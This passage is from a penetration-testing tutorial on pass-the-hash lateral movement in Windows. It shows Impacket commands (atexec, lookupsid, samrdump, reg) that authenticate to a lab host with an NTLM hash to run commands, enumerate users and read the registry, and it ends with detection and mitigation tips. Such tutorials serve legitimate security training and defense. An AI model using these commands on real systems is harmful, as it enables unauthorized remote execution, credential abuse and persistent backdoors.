+<p><span style="color: #000000;">Here, we can see that it contains a welcome message “Welcome to Hacking Articles”.</span></p>
+<h4><span style="color: #800000;">Impacket</span></h4>
+<p><span style="color: #000000;">Our magical bunch of python scripts that had made our lives so easier as shown in this article that they can perform more than we expect from them. We saw that smbclient.py, psexec.py, wmiexec.py, rpcdump.py works quite nicely in the PtH attack but there are other scripts in Impacket that can perform PtH as well. Let’s take a look at them now:</span></p>
+<h5><strong><span style="color: #000000;">Impacket: atexec.py</span></strong></h5>
+<p><span style="color: #000000;">Atexec is one of the methods to connect to a remote system. It uses the Task Scheduler Service to execute the command on the target system. It requires the user credentials, IP Address, domain, the command to execute. We will provide the hash instead of the password to perform a PtH and as we can see that it works like charm.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ihFmq-pKYIo/Xr1QVZx06yI/AAAAAAAAkDU/8ufr-IGCMKIL5E6hDMfTkAGNKMaHAFiIACLcBGAsYHQ/s1600/23.png"/></p>
+<h5><strong><span style="color: #000000;">Impacket: lookupsid.py</span></strong></h5>
+<p><span style="color: #000000;">Lookupsid script can enumerate both local and domain users. It requires domain, username, password, and the IP Address. To perform a PtH attack, we gave the hash instead of the password and we can see that it enumerates the users by authenticating the hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Pa_gEOfG7DM/Xr1QWChsiNI/AAAAAAAAkDY/8vAQn4JP8donhUoVYguHzktD0RNSjeIygCLcBGAsYHQ/s1600/24.png"/></p>
+<h5><span style="color: #000000;"><strong>Impacket: samrdump.py</strong></span></h5>
+<p><span style="color: #000000;">Samrdump is an application that retrieves sensitive information about the specified target machine using the Security Account Manager (SAM). It requires the domain, username, password, and IP Address. To do a PtH attack we replaced the password with the hash and as we can see in the image below that we have the SAM data from the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-oD_aZvJgwDo/Xr1QWT5zCUI/AAAAAAAAkDc/dABs-fUwbSorjL6eqalFk3BdqprGGCltgCLcBGAsYHQ/s1600/25.png"/></p>
+<h5><span style="color: #000000;"><strong>Impacket: reg.py</strong></span></h5>
+<p><span style="color: #000000;">Reg.py script can read, modify, and delete registry values. Attacking the target machine thought the Pass-the-hash attack and make changes in their registry can have real repercussions. The attacker can make the machine more vulnerable by altering the registry keys and it can also make a permanent backdoor that would be a very difficult trace. It requires the domain, username, password, IP Address, and the Registry Key with which you want to interact.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python reg.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s</pre>
+<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5PLiGCfGTRs/Xr1QWnisFNI/AAAAAAAAkDg/kkn-vROERfc25MRTs_xyAyZHKQPRcuFSACLcBGAsYHQ/s1600/26.png" alt="Lateral Movement using Pass the Hash Attack" width="756" height="393"/></p>
+<p><span style="color: #000000;">Read More about Impacket: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/">Impacket Guide: SMB/MSRPC</a></strong></span></span></p>
+<h3><span style="color: #800000;">PtH Detection</span></h3>
+<p><span style="color: #000000;">An individual needs to implement a large number of measures if they want to detect the PtH attack in their network.</span></p>
+<ul>
+<li><span style="color: #000000;">Monitor logs for alerts about PtH tools mentioned in this article</span></li>
+<li><span style="color: #000000;">Monitor unusual activity on hosts like attempts of tampering the LSASS process. (Sysmon)</span></li>
+<li><span style="color: #000000;">Monitor unusual changes made in configurations that can be altered in case the PtH attack is performed. (LocalAccountTokenFilterPolicy, WDigest, etc)</span></li>
+<li><span style="color: #000000;">Monitor multiple successful and failed connections from a single IP address</span></li>
+</ul>
+<h3><span style="color: #800000;">PtH Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">Disable LocalAccountTokeFilterPolicy setting</span></li>
+<li><span style="color: #000000;">Implement Local Administrator Password Solution (LAPS)</span></li>
+<li><span style="color: #000000;">Implement strong Authentication Policies</span></li>
+</ul>
+<h3><span style="color: #800000;">References</span></h3>
+<ul>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-windows-10-39170">SANS Pass-the-Hash in Windows 10</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/">Kali Pass the Hash Toolkit</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1075/">MITRE|ATT&amp;CK Pass the Hash</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong>Black Hat USA 2012</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Conclusion </span></h3>
+<p><span style="color: #000000;">This was it for the attack that the Windows Security Team cannot run from. This attack is at the very core of the authentication process of Windows and some minute changes won’t make it go away. We need to understand the seriousness of this attack there is a reason that the attack that was at its peak during 2010 is still rocking after 10 years.</span></p>
+<p><span style="color: #000000;">To learn more about Lateral Movement in Red Teaming. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on</span> <strong>Twitter</strong> <span style="color: #000000;">and </span><strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
